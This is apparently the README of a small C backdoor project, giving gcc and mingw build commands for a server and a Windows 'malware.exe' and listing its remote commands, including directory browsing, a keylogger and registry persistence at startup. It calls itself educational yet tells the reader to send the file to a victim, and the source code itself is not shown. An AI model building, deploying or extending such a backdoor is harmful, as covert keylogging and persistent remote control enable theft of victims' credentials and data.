# Virus
The program is develop by C language

This is basic code and help us understand the basic workings of malware.

### Author : HOANG MANH KHIEM 
## Setup

*Step 1:*  gcc server.c -o server

*Step 2:* i686-w64-mingw32-gcc -o malware.exe backdoor.c -lwsock32 -lwininet

*OUTPUT:* The program malware.exe is a malware. You can send file.exe to victim or virtual machine.

## Uses

**Note** : When victim start file and now, that computer is very running normal. But it's attacked.

Now, I will open host computer and connect activity malware.

You must check malware realy in victim computer. Use : ./server

I have 1 table more option from hosting to malware.

  + whoami : Check IP victim
  + dir : Display folder and file.
  + cd : Connect to PATH - local malware in victim computer
  + q : quit victim computer
  + keylog_start : Create file keylog.txt and start keylog function in victim computer.
  + persist : Create REGISTRY by malware and malware will start when victim start up.

